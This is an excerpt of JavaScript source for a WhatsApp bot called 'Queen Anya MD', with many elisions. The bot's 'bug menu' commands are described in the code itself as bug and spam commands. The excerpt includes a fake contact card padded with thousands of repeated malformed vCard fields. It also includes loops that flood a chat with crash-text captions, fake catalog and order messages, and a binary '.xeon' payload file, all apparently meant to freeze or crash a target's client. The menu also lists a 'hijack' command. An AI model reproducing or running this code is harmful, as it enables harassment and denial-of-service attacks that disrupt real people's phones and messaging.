const fakeContacts = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ ʙᴜɢs ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴹᴿ ʜᴇx ᴜʟᴛʀᴀ ᴛᴇᴄʜ👻 ${xeonbrutal(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️\nitem1.TEL:+916909137213\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
Anya.sendContact(m.chat, global.owner, fakeContacts)
}
}
break
case 'iosvirtex': {
...
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
Anya.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone}` }, { quoted: doc })
}
}
break
case 'iosvirtex5': {
...
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
Anya.sendMessage(m.chat, { image: { url: 'https://i.ibb.co/zSQFF5F/Nukleal.jpg' }, caption: `${ownername} ${iphone5}` }, { quoted: doc })
}
}
break
case '🌷':{
...
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
Anya.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })}
}
}
break
case 'pollbug': {
...
AnyaBug('Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ ᴘᴏʟʟ ʙᴜɢ')
}
break
...
case 'catalogbug': {
                ...
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./AnyaBug/Anya.jpg') }, { upload: Anya.waUploadToServer })
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
...
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
a = await Anya.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
...
"message": ownername,
"orderTitle": wm, // 
"sellerJid": " 94711449492@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: m.chat, quoted: doc })
Anya.relayMessage(m.chat, xeonoporwot.message, { messageId: xeonoporwot.key.id })
}
}
break
case 'pcxtreme': {
...
"amount1000": "100",
"extendedTextMessage": {
"text": `Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ ʙᴜɢs ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴹᴿ ʜᴇx ᴜʟᴛʀᴀ ᴛᴇᴄʜ👻`,
}
}}), { userJid: m.chat, quoted: doc})
...
ydd = `${ownername}`
for (let i = 0; i < amount; i++) {
brutaltarget = fs.readFileSync('./AnyaBug/cumshot.xeon')
Anya.sendMessage(m.chat, {document: brutaltarget, mimetype: 'application/octet-stream', fileName:`${ownername} ${xeonbutton2}.xeon` }, {quoted:doc})
}
}
break
...
Anya.relayMessage(m.chat, document.message, { messageId: document.key.id })
}
}
break
...
user.afkTime = + new Date
user.afkReason = text
reply(`Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ ʙᴜɢs ᴄʀᴇᴀᴛᴇᴅ ʙʏ ᴹᴿ ʜᴇx ᴜʟᴛʀᴀ ᴛᴇᴄʜ👻 ${m.pushName} ${text ? ': ' + text : ''}`)
}
break
...
Anya.sendText(m.chat, `Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️`, text, {quoted: unicornXeonxD})
}
}
break
case 'textshot': {
                ...
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} Qᴜᴇᴇɴ 𝙰𝚗𝚢𝚊 ᴍᴅ✘️${text ? ': ' + text : ''}`)
            }
            break
//------------------------The End----------------------\\
...
└┬────────────┈ ⳹
  ...
  Anya.sendMessage(m.chat, buttonMessage, {quoted: fkontak})
  }
 break
            break
            case 'command': {
	const sections = [{
								...
								"rows": [
									...
									{
										"title": "ᴬⁿʸᵃ❀⃝ ᴏᴡɴᴇʀ ᴍᴇɴᴜ 🎃",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ᴏᴡɴᴇʀ ᴄᴏᴍᴍᴀɴᴅs.",
										"rowId": `${prefix}ownermenu`
										},
									{
										"title": "ᴬⁿʸᵃ❀⃝ ɢʀᴏᴜᴘ ᴍᴇɴᴜ ✨",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ʟɪsᴛ ᴏғ ᴀʟʟ ɢʀᴏᴜᴘs ᴄᴏᴍᴍᴀɴᴅs.",
										"rowId": `${prefix}groupmenu`
										},
										{
                                                                                "title": "ᴬⁿʸᵃ❀⃝ ᴀɴᴛɪ ʟɪɴᴋs ᴍᴇɴᴜ 🔗",
									...
									{
										"title": "ᴬⁿʸᵃ❀⃝ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ ↘️",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ʟɪsᴛ ᴏғ ᴀʟʟ ᴅᴏᴡɴʟᴏᴀᴅ ᴄᴏᴍᴍᴀɴᴅs.",
										"rowId": `${prefix}downloadmenu`
									},
									{
										"title": "ᴬⁿʸᵃ❀⃝ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ 😳",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ʟɪsᴛ ᴏғ ᴀʟʟ sᴛɪᴄᴋᴇʀ ᴄᴏᴍᴍᴀɴᴅs.",
										"rowId": `${prefix}stickermenu`
									},
									{
										"title": "ᴬⁿʸᵃ❀⃝ sᴇᴀʀᴄʜ ᴍᴇɴᴜ 🔎",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ʟɪsᴛ ᴏғ ᴀʟʟ sᴇᴀʀᴄʜ ᴄᴏᴍᴍᴀɴᴅs.",
										"rowId": `${prefix}searchmenu`
									},
									{
										"title": "ᴬⁿʸᵃ❀⃝ ʀᴀɴᴅᴏᴍ ɪᴍᴀɢᴇ ᴍᴇɴᴜ 😃",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ʟɪsᴛ ᴏғ ᴀʟʟ ʀᴀɴᴅᴏᴍ ɪᴍᴀɢᴇ ᴄᴏᴍᴍᴀɴᴅs.",
										"rowId": `${prefix}randomimagemenu`
									},
									{
										"title": "ᴬⁿʸᵃ❀⃝ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ 🎴",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ʟɪsᴛ ᴏғ ᴀʟʟ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴄᴏᴍᴍᴀɴᴅs.",
									...
									},
									{
										...
										{
										"title": "ᴬⁿʸᵃ❀⃝ ᴀɴɪᴍᴇ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ 😀",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ʟɪsᴛ ᴏғ ᴀʟʟ ᴀɴɪᴍᴇ sᴛɪᴄᴋᴇʀ ᴄᴏᴍᴍᴀɴᴅs.",
										"rowId": `${prefix}animestickermenu`
									     },
									{
										"title": "ᴬⁿʸᵃ❀⃝ ɴsғᴡ ᴍᴇɴᴜ 🤓",
										...
										{
										"title": "ᴬⁿʸᵃ❀⃝ ɢᴀᴍᴇ ᴍᴇɴᴜ 🎮",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ʟɪsᴛ ᴏғ ᴀʟʟ ɢᴀᴍᴇ ᴄᴏᴍᴍᴀɴᴅs.",
										...
										{
										"title": "ᴬⁿʸᵃ❀⃝ ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ʟɪsᴛ ᴏғ ᴀʟʟ ᴍɪsᴄᴇʟʟᴀɴᴇᴏᴜs ᴄᴏᴍᴍᴀɴᴅs.",
										"rowId": `${prefix}othermenu`
									     },
										{
										"title": "ᴬⁿʸᵃ❀⃝ ʙᴜɢ ᴍᴇɴᴜ 😈",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ʟɪsᴛ ᴏғ ᴀʟʟ ʙᴜɢ ᴀɴᴅ sᴘᴀᴍ ᴄᴏᴍᴍᴀɴᴅs.",
										"rowId": `${prefix}bugmenu`
									}
								]
							},
							{
								"title": "ᴄʜᴀᴛ ᴡɪᴛʜ ғᴇʟʟᴏᴡ ᴜsᴇʀ 🌝",
								"rows": [
									{
										"title": "ᴬⁿʸᵃ❀⃝ ᴀɴᴏɴʏᴍᴏᴜs ᴄʜᴀᴛ ᴍᴇɴᴜ",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ʟɪsᴛ ᴏғ ᴀʟʟ ᴀɴᴏɴʏᴍᴏᴜs ᴄʜᴀᴛ ᴄᴏᴍᴍᴀɴᴅs.",
							...
							},
							{
								...
								"rows": [
									{
										"title": "Thanks To ❤️",
										"description": "ᴅɪsᴘʟᴀʏ ᴛʜᴇ ʟɪsᴛ ᴏғ ᴄʀᴇᴅɪᴛ ᴏғ ᴛʜᴇ ʙᴏᴛ ᴄᴏᴍᴍᴀɴᴅs.",
										"rowId": `${prefix}tqtt`
									}
								]
							}
...
const listMessage = {
  text: "ǫᴜᴇᴇɴ ᴀɴʏᴀ ᴍᴅ ʟɪsᴛ ᴍᴇɴᴜ",
  footer: `${botname}\n📍YouTube: ${websitex}\n🍜Script: ${botscript}`,
  title: `Hello ${pushname}`,
  buttonText: "❀⃟ᴛᴀᴘ ʜᴇʀᴇ❀⃝➤",
  sections
}
const sendMsg = await Anya.sendMessage(m.chat, listMessage)
}
break
            case 'allmenu':{
var unicorn = await getBuffer(picak+'ᴬⁿʸᵃ❀⃝ ᴀʟʟ ᴍᴇɴᴜ👑')
...
╠ ${prefix}sᴇᴛʙɪᴏ
╠ ${prefix}ʙᴄᴛᴇxᴛ [ᴛᴇxᴛ]
╠ ${prefix}ʙᴄɪᴍᴀɢᴇ [ʀᴇᴘʟʏ ɪᴍɢ/ᴛᴇxᴛ]
╠ ${prefix}ʙᴄᴠɪᴅᴇᴏ [ʀᴇᴘʟʏ ɪᴍɢ/ᴛᴇxᴛ]
╠ ${prefix}sᴇᴛʙᴏᴛᴘᴘ [ɪᴍᴀɢᴇ]
╠ ${prefix}sᴇᴛᴛʜᴜᴍʙ [ʀᴇᴘʟʏ ɪᴍᴀɢᴇ]
╠ ${prefix}sᴇᴛᴇxɪғ
╠ ${prefix}ʜɪᴊᴀᴄᴋ
╠ ${prefix}ᴄʀᴇᴀᴛᴇɢʀᴏᴜᴘ [ɴᴀᴍᴇ]
╠ ${prefix}ʙʟᴏᴄᴋ [ᴛᴀɢ/ɴᴜᴍʙᴇʀ]
╠ ${prefix}ᴜɴʙʟᴏᴄᴋ [ᴛᴀɢ/ɴᴜᴍʙᴇʀ]
╠═══════✪ ɢʀᴏᴜᴘ ᴍᴇɴᴜ
╠${prefix}ɢʀᴏᴜᴘʟɪɴᴋ
╠${prefix}ᴇᴘʜᴇᴍᴇʀᴀʟ [ᴏᴘᴛɪᴏɴ]
╠${prefix}sᴇᴛɢᴄᴘᴘ [ɪᴍᴀɢᴇ]
╠${prefix}sᴇᴛɴᴀᴍᴇ [ᴛᴇxᴛ]
╠${prefix}sᴇᴛᴅᴇsᴄ [ᴛᴇxᴛ]
╠${prefix}ɢʀᴏᴜᴘ 
╠${prefix}ʀᴇsᴇᴛɢʀᴏᴜᴘʟɪɴᴋ
╠${prefix}ᴇᴅɪᴛɪɴғᴏ [ᴏᴘᴛɪᴏɴ]
╠${prefix}ᴍᴇɴғᴇss [ɴᴜᴍʙᴇʀ]
╠${prefix}ᴀᴅᴅ [ᴜsᴇʀ]
╠${prefix}ᴋɪᴄᴋ [ᴛᴀɢ]
╠${prefix}ʜɪᴅᴇᴛᴀɢ [ᴛᴇxᴛ]
╠${prefix}ᴛᴀɢᴀʟʟ [ᴛᴇxᴛ]
...
╠${prefix}ᴅᴇʟᴠᴏᴛᴇ
╠═══════✪ ᴀɴᴛɪ ʟɪɴᴋs ᴍᴇɴᴜ
╠${prefix}ᴀɴᴛɪʟɪɴᴋɢᴄ [ᴏɴ/ᴏғғ]
╠${prefix}ᴀɴᴛɪʟɪɴᴋᴛɢ [ᴏɴ/ᴏғғ]
╠${prefix}ᴀɴᴛɪʟɪɴᴋᴛᴛ [ᴏɴ/ᴏғғ]
╠${prefix}ᴀɴᴛɪʟɪɴᴋʏᴛᴄʜ [ᴏɴ/ᴏғғ]
╠${prefix}ᴀɴᴛɪʟɪɴᴋʏᴛᴠɪᴅ [ᴏɴ/ᴏғғ]
╠${prefix}ᴀɴᴛɪʟɪɴᴋɪɢ [ᴏɴ/ᴏғғ]
╠${prefix}ᴀɴᴛɪʟɪɴᴋғʙ [ᴏɴ/ᴏғғ]
╠${prefix}ᴀɴᴛɪʟɪɴᴋᴛᴡɪᴛ [ᴏɴ/ᴏғғ]
╠${prefix}ᴀɴᴛɪʟɪɴᴋᴋᴀʟʟ [ᴏɴ/ᴏғғ]
╠${prefix}ᴀɴᴛɪᴠɪʀᴜs [ᴏɴ/ᴏғғ]
╠${prefix}ᴀɴᴛɪᴛᴏxɪᴄ [ᴏɴ/ᴏғғ]
╠${prefix}ᴀɴᴛɪᴡᴀᴍᴇ [ᴏɴ/ᴏғғ]
╠═══════✪ ᴍᴀᴋᴇʀ ᴍᴇɴᴜ
╠${prefix}ᴄᴀɴᴅʏ
╠${prefix}ʙʟᴀᴄᴋᴘɪɴᴋᴡɴᴇᴏɴ
╠${prefix}ᴅᴇᴇᴘsᴇᴀ
╠${prefix}sᴄɪғɪ
╠${prefix}ғɪᴄᴛɪᴏɴ
╠${prefix}ʙᴇʀʀʏ
...
╠${prefix}ɪɴsᴛᴀʀɢʀᴀᴍ [ᴜʀʟ]
╠${prefix}sᴘᴏᴛɪғʏ [ᴜʀʟ]
╠${prefix}ᴍᴇᴅɪᴀғɪʀᴇ [ᴜʀʟ]
╠${prefix}ᴠɪᴅᴇᴏ [ᴜʀʟ]
╠${prefix}ʏᴛᴍᴘ3 [ᴜʀʟ|ǫᴜᴀʟɪᴛʏ]
╠${prefix}sᴏɴɢ [ɴᴀᴍᴇ/ᴜʀʟ]
╠${prefix}xᴠɪᴅᴇᴏ [ᴜʀʟ]
╠${prefix}ʏᴛᴍᴘ4 [ᴜʀʟ|ǫᴜᴀʟɪᴛʏ]
╠${prefix}ɢɪᴛᴄʟᴏɴᴇ [ʀᴇᴘᴏ ʟɪɴᴋ]
╠═══════✪ sᴇᴀʀᴄʜ ᴍᴇɴᴜ
╠${prefix}ᴘʟᴀʏ [ɴᴀᴍᴇ]
╠${prefix}ʏᴛs [ɴᴀᴍᴇ]
╠${prefix}xɴxxx [ɴᴀᴍᴇ]
...
╠${prefix}ɢᴏᴏɢʟᴇ [ɴᴀᴍᴇ]
╠${prefix}ᴀɴɪᴍᴇ [ɴᴀᴍᴇ]
╠${prefix}ᴘɪɴᴛᴇʀᴇsᴛ [ɴᴀᴍᴇ]
╠${prefix}ɪᴍᴀɢᴇ [ɴᴀᴍᴇ]
╠${prefix}ᴡᴀʟʟᴘᴀᴘᴇʀ [ɴᴀᴍᴇ]
╠${prefix}sᴇᴀʀᴄʜɴᴏ [ɴᴜᴍʙᴇʀ]
╠${prefix}ʜᴏʀᴏsᴄᴏᴘᴇ [ǫᴜᴇʀʏ]
╠${prefix}ɪᴍᴅʙ [ᴍᴏᴠɪᴇ ɴᴀᴍᴇ]
╠${prefix}ᴡᴇᴀᴛʜᴇʀ [ʟᴏᴄ ɴᴀᴍᴇ]
╠${prefix}ɢᴇɴsʜɪɴ [ᴄʜᴀʀ ɴᴀᴍᴇ]
╠${prefix}ᴡɪᴋɪᴍᴇᴅɪᴀ [ǫᴜᴇʀʏ]
╠${prefix}ʏᴛsᴇᴀʀᴄʜ [ǫᴜᴇʀʏ]
╠${prefix}ʀɪɴɢᴛᴏɴᴇ [ǫᴜᴇʀʏ]
╠═══════✪ ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ
╠ ${prefix}ᴛᴏɪᴍᴀɢᴇ [ʀᴇᴘʟʏ sᴛɪᴄᴋᴇʀ]
╠ ${prefix}sᴛɪᴄᴋᴇʀ [ʀᴇᴘʟʏ ɪᴍᴀɢᴇ|ɢɪғ]
╠ ${prefix}ᴛᴀᴋᴇ [ʀᴇᴘʟʏ ɪᴍᴀɢᴇ|ɢɪғ|sᴛɪᴋ]
╠ ${prefix}sᴍᴇᴍᴇ [ʀᴇᴘʟʏ ɪᴍᴀɢᴇ]
╠ ${prefix}ᴇᴍᴏᴊɪ [ᴇᴍᴏᴊɪ]
╠ ${prefix}ᴛᴏᴠɪᴅᴇᴏ [ʀᴇᴘʟʏ ɪᴍᴀɢᴇ]
╠ ${prefix}ᴛᴏɢɪғ [ʀᴇᴘʟʏ sᴛɪᴄᴋᴇʀ]
╠ ${prefix}ᴛᴏᴠɴ [ʀᴇᴘʟʏ ᴀᴜᴅ]
╠ ${prefix}ᴛᴏᴍᴘ3 [ʀᴇᴘʟʏ ᴠɴ]
╠ ${prefix}ᴛᴏᴀᴜᴅɪᴏ [ʀᴇᴘʟʏ ᴠɪᴅᴇᴏ]
╠ ${prefix}ᴇʙɪɴᴇʀʏ [ʀᴇᴘʟʏ ᴛᴇxᴛ]
╠ ${prefix}ᴅʙɪɴᴀʀʏ [ʀᴇᴘʟʏ ᴛᴇxᴛ]
╠ ${prefix}ᴛɪɴʏᴜʀʟ [ʟɪɴᴋ]
╠ ${prefix}sᴛʏʟᴇᴛᴇxᴛ [ᴛᴇxᴛ]
╠${prefix}ᴠᴏʟᴜᴍᴇ [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
╠${prefix}ʙᴀss [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
╠${prefix}ʙʟᴏᴡɴ [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
╠${prefix}ᴅᴇᴇᴘ [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
╠${prefix}ᴇᴀʀʀᴀᴘᴇ [ʀᴇᴘʟʏ ᴀᴜᴅɪᴏ]
